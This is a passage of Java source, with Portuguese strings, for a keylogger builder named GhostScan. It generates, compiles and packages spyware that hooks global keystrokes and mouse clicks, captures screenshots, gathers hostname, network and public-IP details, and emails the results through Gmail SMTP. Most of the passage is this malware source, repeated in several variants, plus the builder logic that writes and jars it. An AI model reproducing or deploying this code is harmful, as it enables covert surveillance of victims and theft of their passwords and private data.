								+"private static Point mou;"
								+"private static String mouse;"
									+"private static String var;"
									+"private static String varchar = "+'"'+'"'+";"+"private static GlobalScreen global;"
									+"private static boolean click = false;"
									+"private static int numberKeys = 0;"
									
+"private static String getDateTime() {"
+"DateFormat dateFormat = new SimpleDateFormat("+'"'+"dd/MM/yyyy HH:mm:ss"+'"'+");" 
+"Date date = new Date();" 
+"return dateFormat.format(date);" 
+"}"

									+"private static String getIP(){"
									+"String ip = "+'"'+"Não definido"+'"'+";"
									+"try {"
											+"URL whatismyip = new URL("+'"'+"http://checkip.amazonaws.com"+'"'+");"
												+"BufferedReader in = null;"        
								        	+"in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));"
								        	+"ip = in.readLine();"
								        	+"} catch (IOException e) {}"
								        +"return ip;"
								        +"}"
								        
									+"public void nativeMouseReleased(NativeMouseEvent arg0) {"
									+"click = true;"
									+"}"
									
									+"public void nativeMouseDragged(NativeMouseEvent arg0) {"
									+"click = true;"
									+"}"
									+"public void nativeMouseMoved(NativeMouseEvent es) {"
										
									+"}"
									
									+"public void nativeMouseClicked(NativeMouseEvent es) {"
										
									+"}"
									+"public void nativeKeyPressed(NativeKeyEvent e) {	"
									+"numberKeys = numberKeys + 1;"
										+conditionKey
										+"varchar += var;"
										+"}"
									
									+"public void nativeKeyReleased(NativeKeyEvent e) {"
										
									+"}"
									+"public void nativeKeyTyped(NativeKeyEvent e) {"
										
									+"}"
									+"public void nativeMousePressed(NativeMouseEvent es) {"
										
										
										+"mou = es.getPoint();"
										+"double positionx = mou.getX();"
										+"double positiony = mou.getY();"
										+"String position = null;"
										+"String position1 = null;"
										+"if(positionx < 70 & positiony < 70){"
											+"position = "+'"'+"canto esquerdo(cabeçalho),"+'"'+";"
											+"position1 = "+'"'+"(topo, esquerda)"+'"'+";"
											+"mouse += position+position1;"
											+"}"
											+"if(positionx < 170 & positiony > 600){"
											+"position = "+'"'+"canto esquerdo(Rodapé),"+'"'+";"
											+"position1 = "+'"'+"(rodapé, esquerda)"+'"'+";"
											+"mouse += position+position1;"
											+"}"
										+"if(positionx < 170 & positiony > 190){"
											+"position = "+'"'+"lateral esquerda,"+'"'+";"
											+"position1 = "+'"'+"(meio, esquerda)"+'"'+";"
											+"mouse += position+position1;"
											+"}"
											+"if(positionx > 170 & positiony > 190 & positionx < 300 & positiony < 300){"
											+"position = "+'"'+"Centro da página,"+'"'+";"
											+"position1 = "+'"'+"(meio, próximo ao topo e esquerda)"+'"'+";"
											+"mouse += position+position1;"
											+"}"			
										+"if(positionx > 270 & positiony > 400 & positionx < 400){"
											+"position = "+'"'+"Centro da página,"+'"'+";"
											+"position1 = "+'"'+"(meio, próximo ao rodapé e esquerda)"+'"'+";"
											+"mouse += position+position1;"
											+"}"
										+"if(positionx > 170 & positiony < 190){"
											+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
											+"position1 = "+'"'+"(topo, próximo à esquerda)"+'"'+";"
											+"mouse += position+position1;"
											+"}"
										+"if(positionx > 400 & positiony < 190){"
											+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
											+"position1 = "+'"'+"(topo, próximo à direita)"+'"'+";"
											+"mouse += position+position1;"
											+"}"
										
											
							+"}"
									
									
							+"public static void main(String[] args) throws EmailException, IOException{"
										
							+"new Thread(new Runnable(){"
								+"@Override "
								+"public void run(){"
									+"while(true){"			
									+"if(click || numberKeys == 5){"
									
											+"HtmlEmail email = new HtmlEmail();"
											+"try{"
											+"email.setHostName("+'"'+"smtp.gmail.com"+'"'+");"
											+"email.setSmtpPort(465);"
											+ "email.addTo("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
											+ "email.setFrom("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
												+"email.setDebug(true);"
												+"email.setSSLOnConnect(true);"
										
												
												+"List list = new ArrayList();"
												
												+"String info = "+'"'+"Obtendo Informacões da Rede:"+'"'+";"
												
												+"InetAddress addr = null;"
												+"try {"
													+"addr = InetAddress.getLocalHost();"
													+"} catch (UnknownHostException e1) {"
												
													+"e1.printStackTrace();"
													+"}"
											    +"byte[] ipAddr = addr.getAddress();"
											    +"String hostname = addr.getHostName();"
											    
												+"String computerName = "+'"'+"Nome do Computador completo: "+'"'+"+ hostname;"
											    
											    +"InetAddress localHost = null;"
											    +"try {"
											    +"localHost = Inet4Address.getLocalHost();"
											    +"} catch (UnknownHostException e1) {"
													
												+"e1.printStackTrace();"
												+"}"
											    +"NetworkInterface networkInterface = null;"
											    +"try {"
											    +"networkInterface = NetworkInterface.getByInetAddress(localHost);"
											    +"} catch (SocketException e1) {"
													
												+"e1.printStackTrace();"
												+"}"
											    
												+"String placa = "+'"'+"Placa: "+'"'+"+ networkInterface.getDisplayName();"
											    
												+"String rede = "+'"'+"Rede: "+'"'+" + networkInterface.getInterfaceAddresses();"
											      
											      +"String address1 = null, iface1 = null, bc1 = null, mask1 = null;"
											      +"String infoRede = null;"
											      +"Enumeration ifaces = null;"
											      +"try {"
											      +"ifaces = NetworkInterface.getNetworkInterfaces();"
											      +"} catch (SocketException e1) {"


													+"e1.printStackTrace();"
													+"}"
													+"while (ifaces.hasMoreElements()) {"
													+"NetworkInterface iface = (NetworkInterface)ifaces.nextElement();"
													+"String face = "+'"'+"Obtendo Informacões da interface: "+'"'+"+ iface.getName();"
													+"iface1 += face+"+'"'+"<br>"+'"'+";"
											        
											        +"for (InterfaceAddress address : iface.getInterfaceAddresses())"
											        +"{"
											        	
											+"String ipAddress = "+'"'+"IP........: "+'"'+" + address.getAddress().toString();"
											          +"address1 += ipAddress+"+'"'+"<br>"+'"'+";"
											          
											          
											          +"String bc = "+'"'+"Broadcast.: "+'"'+" + address.getBroadcast();"
											        	  +"bc1 += bc+"+'"'+"<br>"+'"'+";"
											          
											   
											          +"String mask = "+'"'+"Máscara...: "+'"'+" + address.getNetworkPrefixLength();"
											        	  +" mask1 += mask+"+'"'+"<br>"+'"'+";"
											        	  +"}"
											        
												
												+"}"
												
												+"try{"
												+"Robot robot = new Robot();"  
												            
												+"Toolkit toolkit = Toolkit.getDefaultToolkit();"  
												+"final Dimension dimension = toolkit.getScreenSize();"  
												             
												                 
												+"BufferedImage bi = robot.createScreenCapture(new Rectangle(0, 0, dimension.width, dimension.height));"  
												+"try{"
												+"ImageIO.write(bi, "+'"'+"JPEG"+'"'+", new File("+'"'+"camera.JPEG"+'"'+"));"
												+"}catch(IOException ey){"
												+"ey.printStackTrace();"
												+"}"
												           
												+"}catch (AWTException e1) {"
															
												+"e1.printStackTrace();"
												+"}"
											      
											      
											     
											            
											        
												+"String getIp = getIP();"
												
										           
										+"StringBuilder builder = new StringBuilder();"
										+"builder.append("+'"'+"<html>"+'"'
														+'+'+'"'+"<body>"+'"'
														+'+'+'"'+"<h1>GhostScan - "+'"'+"+getDateTime()+"+'"'+"-"+'"'+"+hostname+"+'"'+"</h1>"+'"'
														
														+'+'+'"'+"<p><font color='red'>O mouse foi clicado em: </font>"+'"'+"+mouse+"+'"'+"<br><br><font color='green'>teclado: </font> "+'"'+"+varchar+"+'"'+"<br><br><br><b>"+'"'+"+info+"+'"'+"</b><br>"+'"'+"+computerName+"+'"'+"<br><b>"+'"'+"+placa+"+'"'+"</b><br><b>"+'"'+"+rede+"+'"'+"</b><br><br><font color='red'>"+'"'+"+iface1+"+'"'+"</font><br><font color='green'><i>"+'"'+"+address1+"+'"'+"</i></font><br><font color='blue'>"+'"'+"+bc1+"+'"'+"</font><br><font color='gray'>"+'"'+"+mask1+"+'"'+"</font></p>"+'"'
														+'+'+'"'+"</body>"+'"'
														+'+'+'"'+"</html>"+'"'+");"
														
														+"email.setMsg(builder.toString());"
												
													
														+"}"
														+"catch (EmailException e1) {"
														+"e1.printStackTrace();"
														+"}"  
											
											+"EmailAttachment anexo = new EmailAttachment();"
											+"anexo.setPath("+'"'+"camera.JPEG"+'"'+");"
											+"anexo.setDisposition(EmailAttachment.ATTACHMENT);"
											+"anexo.setName("+'"'+"camera.JPEG"+'"'+");"
													+"try {"
													+"email.attach(anexo);"
													+"} catch (EmailException e1) {"
											
												+"e1.printStackTrace();"
												+"}"
											
											+"email.setSubject("+'"'+"GhostScan"+'"'+");"
											+"email.setSSL(true);"
											+"email.setAuthentication(  "+'"'+campoemail.getText()+'"'+", "+'"'+senha.getText()+'"'+");"
													+"try {"
												
							+"email.send();"
							+"}" 
							+"catch (EmailException e1) {"
							+"e1.printStackTrace();"
								+"}"
								+"numberKeys = 0;"
								+"click = false;"
								
							+"}"									    
									
									
									+"}"
								+"}"
								+"}).start();"
									    
+init	
+"Date date = new Date();"
+"String strDate = DateFormat.getDateInstance(DateFormat.MEDIUM).format(date);"
+delfile								
+ocult								    
						


									+"try {"
									+"GlobalScreen.registerNativeHook();"
										+"} "
										+"catch (NativeHookException ex) {"

										+"System.err.println(ex.getMessage());"
											+"System.exit(1);"
											+"}"
											
											+"try {"
											
											+"global.registerNativeHook();"
											+"global.addNativeKeyListener(new KeyLogger());"
											+"global.addNativeMouseListener(new KeyLogger());"
											+"} catch (NativeHookException e) {"
												+"e.printStackTrace();"
											+"System.exit(1);"
											+"}"
										+"}"
										+"}";
						
						String codigoRegIpRed = "package key;"
						+ "import java.awt.AWTException;"
						+ "import java.awt.Dimension;"
						+"import java.awt.Point;"
						+"import java.awt.Rectangle;"
						+"import net.jimmc.jshortcut.JShellLink;"
						+"import java.awt.Robot;"
						+"import java.io.BufferedReader;"
						+"import java.io.BufferedWriter;"
						+"import java.io.File;"
						+"import java.io.FileWriter;"
						+"import java.awt.Toolkit;"
						+"import java.awt.image.BufferedImage;"
						+"import java.io.BufferedReader;"
						+"import java.io.File;"
						+"import java.io.IOException;"
						+"import java.io.InputStreamReader;"
						+"import java.net.Inet4Address;"
						+"import java.net.InetAddress;"
						+"import java.net.InterfaceAddress;"
						+"import java.net.NetworkInterface;"
						+"import java.net.SocketException;"
						+"import java.net.URL;"
						+"import java.net.UnknownHostException;"
						+"import java.util.ArrayList;"
						+"import java.util.Enumeration;"
						+"import java.util.List;"
						+"import javax.imageio.ImageIO;"
						+"import org.apache.commons.mail.DefaultAuthenticator;"
						+"import org.apache.commons.mail.EmailAttachment;"
						+"import org.apache.commons.mail.EmailException;"
						+"import org.apache.commons.mail.HtmlEmail;"
						+"import org.jnativehook.GlobalScreen;"
						+"import org.jnativehook.NativeHookException;"
						+"import org.jnativehook.keyboard.NativeKeyEvent;"
						+"import org.jnativehook.keyboard.NativeKeyListener;"
						+"import org.jnativehook.mouse.NativeMouseEvent;"
						+"import org.jnativehook.mouse.NativeMouseInputListener;"
						+"import java.util.Date;"
						+"import java.text.DateFormat;"
						+"import java.text.SimpleDateFormat;"
						+"public class KeyLogger implements NativeMouseInputListener, NativeKeyListener {"
						+"private static Point mou;"
						+"private static String mouse;"
							+"private static String var;"
							+"private static String varchar = "+'"'+'"'+";"+"private static GlobalScreen global;"
							+"private static boolean click = false;"
							+"private static int numberKeys = 0;"
							
+"private static String getDateTime() {"
+"DateFormat dateFormat = new SimpleDateFormat("+'"'+"dd/MM/yyyy HH:mm:ss"+'"'+");" 
+"Date date = new Date();" 
+"return dateFormat.format(date);" 
+"}"

							+"private static String getIP(){"
							+"String ip = "+'"'+"Não definido"+'"'+";"
							+"try {"
									+"URL whatismyip = new URL("+'"'+"http://checkip.amazonaws.com"+'"'+");"
										+"BufferedReader in = null;"        
						        	+"in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));"
						        	+"ip = in.readLine();"
						        	+"} catch (IOException e) {}"
						        +"return ip;"
						        +"}"
						        
							+"public void nativeMouseReleased(NativeMouseEvent arg0) {"
							+"click = true;"
							+"}"
							
							+"public void nativeMouseDragged(NativeMouseEvent arg0) {"
							+"click = true;"
							+"}"
							+"public void nativeMouseMoved(NativeMouseEvent es) {"
								
							+"}"
							
							+"public void nativeMouseClicked(NativeMouseEvent es) {"
								
							+"}"
							+"public void nativeKeyPressed(NativeKeyEvent e) {	"
							+"numberKeys = numberKeys + 1;"
								+conditionKey
								+"varchar += var;"
								+"}"
							
							+"public void nativeKeyReleased(NativeKeyEvent e) {"
								
							+"}"
							+"public void nativeKeyTyped(NativeKeyEvent e) {"
								
							+"}"
							+"public void nativeMousePressed(NativeMouseEvent es) {"
								
								
								+"mou = es.getPoint();"
								+"double positionx = mou.getX();"
								+"double positiony = mou.getY();"
								+"String position = null;"
								+"String position1 = null;"
								+"if(positionx < 70 & positiony < 70){"
									+"position = "+'"'+"canto esquerdo(cabeçalho),"+'"'+";"
									+"position1 = "+'"'+"(topo, esquerda)"+'"'+";"
									+"mouse += position+position1;"
									+"}"
									+"if(positionx < 170 & positiony > 600){"
									+"position = "+'"'+"canto esquerdo(Rodapé),"+'"'+";"
									+"position1 = "+'"'+"(rodapé, esquerda)"+'"'+";"
									+"mouse += position+position1;"
									+"}"
								+"if(positionx < 170 & positiony > 190){"
									+"position = "+'"'+"lateral esquerda,"+'"'+";"
									+"position1 = "+'"'+"(meio, esquerda)"+'"'+";"
									+"mouse += position+position1;"
									+"}"
									+"if(positionx > 170 & positiony > 190 & positionx < 300 & positiony < 300){"
									+"position = "+'"'+"Centro da página,"+'"'+";"
									+"position1 = "+'"'+"(meio, próximo ao topo e esquerda)"+'"'+";"
									+"mouse += position+position1;"
									+"}"			
								+"if(positionx > 270 & positiony > 400 & positionx < 400){"
									+"position = "+'"'+"Centro da página,"+'"'+";"
									+"position1 = "+'"'+"(meio, próximo ao rodapé e esquerda)"+'"'+";"
									+"mouse += position+position1;"
									+"}"
								+"if(positionx > 170 & positiony < 190){"
									+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
									+"position1 = "+'"'+"(topo, próximo à esquerda)"+'"'+";"
									+"mouse += position+position1;"
									+"}"
								+"if(positionx > 400 & positiony < 190){"
									+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
									+"position1 = "+'"'+"(topo, próximo à direita)"+'"'+";"
									+"mouse += position+position1;"
									+"}"
								
									
					+"}"
							
							
					+"public static void main(String[] args) throws EmailException, IOException{"
								
+"new Thread(new Runnable(){"
+"@Override "
+"public void run(){"
	+"while(true){"			
	+"if(click || numberKeys == 5){"
	
									+"HtmlEmail email = new HtmlEmail();"
									+"try{"
									+"email.setHostName("+'"'+"smtp.gmail.com"+'"'+");"
									+"email.setSmtpPort(465);"
									+ "email.addTo("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
									+ "email.setFrom("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
										+"email.setDebug(true);"
										+"email.setSSLOnConnect(true);"
								
										
										+"List list = new ArrayList();"
										
										+"String info = "+'"'+"Obtendo Informacões da Rede:"+'"'+";"
										
										+"InetAddress addr = null;"
										+"try {"
											+"addr = InetAddress.getLocalHost();"
											+"} catch (UnknownHostException e1) {"
										
											+"e1.printStackTrace();"
											+"}"
									    +"byte[] ipAddr = addr.getAddress();"
									    +"String hostname = addr.getHostName();"
									    
										+"String computerName = "+'"'+"Nome do Computador completo: "+'"'+"+ hostname;"
									    
									    +"InetAddress localHost = null;"
									    +"try {"
									    +"localHost = Inet4Address.getLocalHost();"
									    +"} catch (UnknownHostException e1) {"
											
										+"e1.printStackTrace();"
										+"}"
									    +"NetworkInterface networkInterface = null;"
									    +"try {"
									    +"networkInterface = NetworkInterface.getByInetAddress(localHost);"
									    +"} catch (SocketException e1) {"
											
										+"e1.printStackTrace();"
										+"}"
									    
										+"String placa = "+'"'+"Placa: "+'"'+"+ networkInterface.getDisplayName();"
									    
										+"String rede = "+'"'+"Rede: "+'"'+" + networkInterface.getInterfaceAddresses();"
									      
									      +"String address1 = null, iface1 = null, bc1 = null, mask1 = null;"
									      +"String infoRede = null;"
									      +"Enumeration ifaces = null;"
									      +"try {"
									      +"ifaces = NetworkInterface.getNetworkInterfaces();"
									      +"} catch (SocketException e1) {"


											+"e1.printStackTrace();"
											+"}"
											+"while (ifaces.hasMoreElements()) {"
											+"NetworkInterface iface = (NetworkInterface)ifaces.nextElement();"
											+"String face = "+'"'+"Obtendo Informacões da interface: "+'"'+"+ iface.getName();"
											+"iface1 += face+"+'"'+"<br>"+'"'+";"
									        
									        +"for (InterfaceAddress address : iface.getInterfaceAddresses())"
									        +"{"
									        	
									+"String ipAddress = "+'"'+"IP........: "+'"'+" + address.getAddress().toString();"
									          +"address1 += ipAddress+"+'"'+"<br>"+'"'+";"
									          
									          
									          +"String bc = "+'"'+"Broadcast.: "+'"'+" + address.getBroadcast();"
									        	  +"bc1 += bc+"+'"'+"<br>"+'"'+";"
									          
									   
									          +"String mask = "+'"'+"Máscara...: "+'"'+" + address.getNetworkPrefixLength();"
									        	  +" mask1 += mask+"+'"'+"<br>"+'"'+";"
									        	  +"}"
									        
										
										+"}"
										   
									        
										+"String getIp = getIP();"
										
								           
								+"StringBuilder builder = new StringBuilder();"
								+"builder.append("+'"'+"<html>"+'"'
												+'+'+'"'+"<body>"+'"'
												+'+'+'"'+"<h1>GhostScan - "+'"'+"+getDateTime()+"+'"'+"-"+'"'+"+hostname+"+'"'+"</h1>"+'"'
												
												+'+'+'"'+"<p><font color='blue'>ip: </font>"+'"'+"+getIP()+"+'"'+"</p><p><font color='red'>O mouse foi clicado em: </font>"+'"'+"+mouse+"+'"'+"<br><br><font color='green'>teclado: </font> "+'"'+"+varchar+"+'"'+"<br><br><br><b>"+'"'+"+info+"+'"'+"</b><br>"+'"'+"+computerName+"+'"'+"<br><b>"+'"'+"+placa+"+'"'+"</b><br><b>"+'"'+"+rede+"+'"'+"</b><br><br><font color='red'>"+'"'+"+iface1+"+'"'+"</font><br><font color='green'><i>"+'"'+"+address1+"+'"'+"</i></font><br><font color='blue'>"+'"'+"+bc1+"+'"'+"</font><br><font color='gray'>"+'"'+"+mask1+"+'"'+"</font></p>"+'"'
												+'+'+'"'+"</body>"+'"'
												+'+'+'"'+"</html>"+'"'+");"
												
												+"email.setMsg(builder.toString());"
										
											
												+"}"
												+"catch (EmailException e1) {"
												+"e1.printStackTrace();"
												+"}"  
									
									+"email.setSubject("+'"'+"GhostScan"+'"'+");"
									+"email.setSSL(true);"
									+"email.setAuthentication(  "+'"'+campoemail.getText()+'"'+", "+'"'+senha.getText()+'"'+");"
											+"try {"
										
					+"email.send();"
					+"}" 
					+"catch (EmailException e1) {"
					+"e1.printStackTrace();"
						+"}"

					+"numberKeys = 0;"
					+"click = false;"
					
					+"}"
	
+"}"
+"}"
+"}).start();"
							    
+init   
+"Date date = new Date();"
+"String strDate = DateFormat.getDateInstance(DateFormat.MEDIUM).format(date);"
+delfile				
+ocult							


							    
								
							+"try {"
							+"GlobalScreen.registerNativeHook();"
								+"} "
								+"catch (NativeHookException ex) {"

								+"System.err.println(ex.getMessage());"
									+"System.exit(1);"
									+"}"
									
									+"try {"
									
									+"global.registerNativeHook();"
									+"global.addNativeKeyListener(new KeyLogger());"
									+"global.addNativeMouseListener(new KeyLogger());"
									+"} catch (NativeHookException e) {"
										+"e.printStackTrace();"
									+"System.exit(1);"
									+"}"
								+"}"
								+"}";
						
					if(check.isSelected() & !check1.isSelected() & !checkIp.isSelected() & !checkRede.isSelected()){
						FileWriter write;
						FileWriter arquivo;
						try {
							arquivo = new FileWriter(new File("key/KeyLogger.java"));
						
						arquivo.write(codigoMouse);
						arquivo.close();
						write = new FileWriter("jar.bat");
						write.write("set keylogger="+caminho.getText()
						+"\n\n jar.exe -cvfm %keylogger%.jar MANIFEST.mf META-INF com javax key jni net org");
						write.close();
						}catch (IOException e) {
							
							e.printStackTrace();
						}
						catch (Exception e) {
							
							e.printStackTrace();
						}
					}
					
					if(check.isSelected() & !check1.isSelected() & checkIp.isSelected() & !checkRede.isSelected()){
						FileWriter write2;
						FileWriter arquivo2;
						try {
							arquivo2 = new FileWriter(new File("key/KeyLogger.java"));
						
						arquivo2.write(codigoRegIp);
						arquivo2.close();
						write2 = new FileWriter("jar.bat");
						write2.write("set keylogger="+caminho.getText()
						+"\n\n jar.exe -cvfm %keylogger%.jar MANIFEST.mf META-INF com javax key jni net org");
						write2.close();
						}catch (IOException e2) {
							
							e2.printStackTrace();
						}
						catch (Exception e2) {
							
							e2.printStackTrace();
						}
					}
					
					if(!check.isSelected() & !check1.isSelected() & !checkIp.isSelected() & !checkRede.isSelected()){
						FileWriter write1;
						FileWriter arquivo1;
						try {
							arquivo1 = new FileWriter(new File("key/KeyLogger.java"));
						
						arquivo1.write(codigo);
						arquivo1.close();
						write1 = new FileWriter("jar.bat");
						write1.write("set keylogger="+caminho.getText()
						+"\n\n jar.exe -cvfm %keylogger%.jar MANIFEST.mf META-INF com javax key jni net org");
						write1.close();
						}catch (IOException e1) {
							
							e1.printStackTrace();
						}
						catch (Exception e1) {
							
							e1.printStackTrace();
						}
					}
					
					if(check.isSelected() & check1.isSelected() & !checkIp.isSelected() & !checkRede.isSelected()){
						FileWriter write3;
						FileWriter arquivo3;
						try {
							arquivo3 = new FileWriter(new File("key/KeyLogger.java"));
						
						arquivo3.write(codigoRegSrc);
						arquivo3.close();
						write3 = new FileWriter("jar.bat");
						write3.write("set keylogger="+caminho.getText()
						+"\n\n jar.exe -cvfm %keylogger%.jar MANIFEST.mf META-INF com javax key jni net org");
						write3.close();
						}catch (IOException e3) {
							
							e3.printStackTrace();
						}
						catch (Exception e3) {
							
							e3.printStackTrace();
						}
					}
					
					if(check.isSelected() & check1.isSelected() & checkIp.isSelected() & !checkRede.isSelected()){
						FileWriter write4;
						FileWriter arquivo4;
						try {
							arquivo4 = new FileWriter(new File("key/KeyLogger.java"));
						
						arquivo4.write(codigoRegSrcIp);
						arquivo4.close();
						write4 = new FileWriter("jar.bat");
						write4.write("set keylogger="+caminho.getText()
						+"\n\n jar.exe -cvfm %keylogger%.jar MANIFEST.mf META-INF com javax key jni net org");
						write4.close();
						}catch (IOException e4) {
							
							e4.printStackTrace();
						}
						catch (Exception e4) {
							
							e4.printStackTrace();
						}
					}
					
					if(check.isSelected() & !check1.isSelected() & !checkIp.isSelected() & checkRede.isSelected()){
						FileWriter write5;
						FileWriter arquivo5;
						try {
							arquivo5 = new FileWriter(new File("key/KeyLogger.java"));
						
						arquivo5.write(codigoRegRed);
						arquivo5.close();
						write5 = new FileWriter("jar.bat");
						write5.write("set keylogger="+caminho.getText()
						+"\n\n jar.exe -cvfm %keylogger%.jar MANIFEST.mf META-INF com javax key jni net org");
						write5.close();
						}catch (IOException e5) {
							
							e5.printStackTrace();
						}
						catch (Exception e5) {
							
							e5.printStackTrace();
						}
					}
					
					if(!check.isSelected() & check1.isSelected() & !checkIp.isSelected() & checkRede.isSelected()){
						FileWriter write6;
						FileWriter arquivo6;
						try {
							arquivo6 = new FileWriter(new File("key/KeyLogger.java"));
						
						arquivo6.write(codigoSrcRed);
						arquivo6.close();
						write6 = new FileWriter("jar.bat");
						write6.write("set keylogger="+caminho.getText()
						+"\n\n jar.exe -cvfm %keylogger%.jar MANIFEST.mf META-INF com javax key jni net org");
						write6.close();
						}catch (IOException e6) {
							
							e6.printStackTrace();
						}
						catch (Exception e6) {
							
							e6.printStackTrace();
						}
					}
				
					if(!check.isSelected() & check1.isSelected() & checkIp.isSelected() & !checkRede.isSelected()){
						FileWriter write7;
						FileWriter arquivo7;
						try {
							arquivo7 = new FileWriter(new File("key/KeyLogger.java"));
						
						arquivo7.write(codigoSrcIp);
						arquivo7.close();
						write7 = new FileWriter("jar.bat");
						write7.write("set keylogger="+caminho.getText()
						+"\n\n jar.exe -cvfm %keylogger%.jar MANIFEST.mf META-INF com javax key jni net org");
						write7.close();
						}catch (IOException e7) {
							
							e7.printStackTrace();
						}
						catch (Exception e7) {
							
							e7.printStackTrace();
						}
					}
				
					if(!check.isSelected() & !check1.isSelected() & checkIp.isSelected() & checkRede.isSelected()){
						FileWriter write8;
						FileWriter arquivo8;
						try {
							arquivo8 = new FileWriter(new File("key/KeyLogger.java"));
						
						arquivo8.write(codigoIpRed);
						arquivo8.close();
						write8 = new FileWriter("jar.bat");
						write8.write("set keylogger="+caminho.getText()
						+"\n\n jar.exe -cvfm %keylogger%.jar MANIFEST.mf META-INF com javax key jni net org");
						write8.close();
						}catch (IOException e8) {
							
							e8.printStackTrace();
						}
						catch (Exception e8) {
							
							e8.printStackTrace();
						}
					}
					
					if(!check.isSelected() & !check1.isSelected() & checkIp.isSelected() & !checkRede.isSelected()){
						FileWriter write9;
						FileWriter arquivo9;
						try {
							arquivo9 = new FileWriter(new File("key/KeyLogger.java"));
						
						arquivo9.write(codigoIp);
						arquivo9.close();
						write9 = new FileWriter("jar.bat");
						write9.write("set keylogger="+caminho.getText()
						+"\n\n jar.exe -cvfm %keylogger%.jar MANIFEST.mf META-INF com javax key jni net org");
						write9.close();
						}catch (IOException e9) {
							
							e9.printStackTrace();
						}
						catch (Exception e9) {
							
							e9.printStackTrace();
						}
					}
					
					if(!check.isSelected() & !check1.isSelected() & !checkIp.isSelected() & checkRede.isSelected()){
						FileWriter write10;
						FileWriter arquivo10;
						try {
							arquivo10 = new FileWriter(new File("key/KeyLogger.java"));
						
						arquivo10.write(codigoRed);
						arquivo10.close();
						write10 = new FileWriter("jar.bat");
						write10.write("set keylogger="+caminho.getText()
						+"\n\n jar.exe -cvfm %keylogger%.jar MANIFEST.mf META-INF com javax key jni net org");
						write10.close();
						}catch (IOException e10) {
							
							e10.printStackTrace();
						}
						catch (Exception e10) {
							
							e10.printStackTrace();
						}
					}
					
					if(check.isSelected() & check1.isSelected() & checkIp.isSelected() & checkRede.isSelected()){
						FileWriter write11;
						FileWriter arquivo11;
						try {
							arquivo11 = new FileWriter(new File("key/KeyLogger.java"));
						
						arquivo11.write(codigoRegScrIpRed);
						arquivo11.close();
						write11 = new FileWriter("jar.bat");
						write11.write("set keylogger="+caminho.getText()
						+"\n\n jar.exe -cvfm %keylogger%.jar MANIFEST.mf META-INF com javax key jni net org");
						write11.close();
						}catch (IOException e11) {
							
							e11.printStackTrace();
						}
						catch (Exception e11) {
							
							e11.printStackTrace();
						}
					}
					
					if(!check.isSelected() & check1.isSelected() & checkIp.isSelected() & checkRede.isSelected()){
						FileWriter write12;
						FileWriter arquivo12;
						try {
							arquivo12 = new FileWriter(new File("key/KeyLogger.java"));
						
						arquivo12.write(codigoSrcIpRed);
						arquivo12.close();
						write12 = new FileWriter("jar.bat");
						write12.write("set keylogger="+caminho.getText()
						+"\n\n jar.exe -cvfm %keylogger%.jar MANIFEST.mf META-INF com javax key jni net org");
						write12.close();
						}catch (IOException e12) {
							
							e12.printStackTrace();
						}
						catch (Exception e12) {
							
							e12.printStackTrace();
						}
					}
					
					if(!check.isSelected() & check1.isSelected() & checkIp.isSelected() & checkRede.isSelected()){
						FileWriter write13;
						FileWriter arquivo13;
						try {
							arquivo13 = new FileWriter(new File("key/KeyLogger.java"));
						
						arquivo13.write(codigoSrcIpRed);
						arquivo13.close();
						write13 = new FileWriter("jar.bat");
						write13.write("set keylogger="+caminho.getText()
						+"\n\n jar.exe -cvfm %keylogger%.jar MANIFEST.mf META-INF com javax key jni net org");
						write13.close();
						}catch (IOException e13) {
							
							e13.printStackTrace();
						}
						catch (Exception e13) {
							
							e13.printStackTrace();
						}
					}
					
					
						
					if(!check.isSelected() & check1.isSelected() & !checkIp.isSelected() & !checkRede.isSelected()){
						FileWriter write14;
						FileWriter arquivo14;
						try {
							arquivo14 = new FileWriter(new File(getPath+"/key/KeyLogger.java"));
						
						arquivo14.write(codigoSrc);
						arquivo14.close();
						write14 = new FileWriter("jar.bat");
						write14.write("set keylogger="+caminho.getText()
						+"\n\n jar.exe -cvfm %keylogger%.jar MANIFEST.mf META-INF com javax key jni net org");
						write14.close();
						}catch (IOException e14) {
							
							e14.printStackTrace();
						}
						catch (Exception e14) {
							
							e14.printStackTrace();
						}
					}
					
					if(check.isSelected() & check1.isSelected() & !checkIp.isSelected() & checkRede.isSelected()){
						FileWriter write15;
						FileWriter arquivo15;
						try {
							arquivo15 = new FileWriter(new File("key/KeyLogger.java"));
						
						arquivo15.write(codigoRegSrcRed);
						arquivo15.close();
						write15 = new FileWriter("jar.bat");
						write15.write("set keylogger="+caminho.getText()
						+"\n\n jar.exe -cvfm ..//%keylogger%.jar MANIFEST.mf META-INF com javax key jni net org");
						write15.close();
						}catch (IOException e15) {
							
							e15.printStackTrace();
						}
						catch (Exception e15) {
							
							e15.printStackTrace();
						}
					}
					
					if(check.isSelected() & !check1.isSelected() & checkIp.isSelected() & checkRede.isSelected()){
						FileWriter write16;
						FileWriter arquivo16;
						try {
							arquivo16 = new FileWriter(new File("key/KeyLogger.java"));
						
						arquivo16.write(codigoRegIpRed);
						arquivo16.close();
						write16 = new FileWriter("jar.bat");
						write16.write("set keylogger="+caminho.getText()
						+"\n\n jar.exe -cvfm %keylogger%.jar MANIFEST.mf META-INF com javax key jni net org");
						write16.close();
						}catch (IOException e16) {
							
							e16.printStackTrace();
						}
						catch (Exception e16) {
							
							e16.printStackTrace();
						}
					}
					
				if(JOptionPane.showConfirmDialog(null, "<html><font color='blue'>GhostScan diz: Prepare-se para oque vai ver!<br>"
						+ "Tenha certeza que quer criar o arquivo?</font></html>") == JOptionPane.YES_OPTION) {
					
					String javac = "cmd /c javac.lnk";
					
					try {
						
						Runtime.getRuntime().exec(javac);
						Thread.sleep(4000);
			           
			        } catch (Exception arg) {
			            arg.printStackTrace();
			        }
					
					String jar2 = "cmd /c jar.lnk";
					try {
						Runtime.getRuntime().exec(jar2);
						Thread.sleep(1000);
			        } catch (Exception arg) {
			            arg.printStackTrace();
			        }
					
					msg.setText("O keylogger foi criado com sucesso!");
					msg.setForeground(Color.green);
		            Frame option = JOptionPane.getRootFrame();
		            option.dispose();
		           
		        }else{
